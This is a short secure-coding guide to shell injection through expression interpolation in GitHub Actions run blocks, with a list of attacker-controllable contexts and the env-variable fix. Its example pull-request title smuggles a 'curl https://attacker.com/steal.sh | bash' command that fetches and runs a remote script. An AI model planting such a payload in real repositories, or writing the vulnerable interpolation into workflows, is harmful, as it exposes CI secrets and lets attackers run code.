# Shell Injection via Expression Interpolation

## What it is

GitHub Actions `run:` blocks execute shell commands. When you interpolate `${{ }}` expressions containing attacker-controlled values directly into a `run:` block, the value is pasted into the shell command before execution. An attacker can craft input containing shell metacharacters that execute arbitrary code.

## How it's exploited

A pull request with this title:

```
"; curl https://attacker.com/steal.sh | bash; echo "
```

When interpolated into:

```yaml
run: echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
```

Becomes:

```bash
echo "Thanks for the PR: "; curl https://attacker.com/steal.sh | bash; echo ""
```

The attacker's script runs with full access to your CI environment, including secrets.

## Dangerous contexts

These `${{ }}` expressions are attacker-controllable:

- `github.event.pull_request.title` / `.body` / `.head.ref`
- `github.event.issue.title` / `.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.discussion.title` / `.body`
- `github.head_ref`
- `github.actor` / `github.triggering_actor`

## How to fix

Move the expression to a step-level `env:` block. Environment variables are not interpreted by the shell as code:

```yaml
# Before (vulnerable)
- run: echo "${{ github.event.pull_request.title }}"

# After (safe)
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
```

## Real-world incidents

- [TanStack/router npm compromise (May 2026)](https://medium.com/@jordanritter/security-hardening-github-workflows-at-scale-d291a33774e1) -- attacker used shell injection via cache poisoning + expression interpolation to publish 84 malicious packages
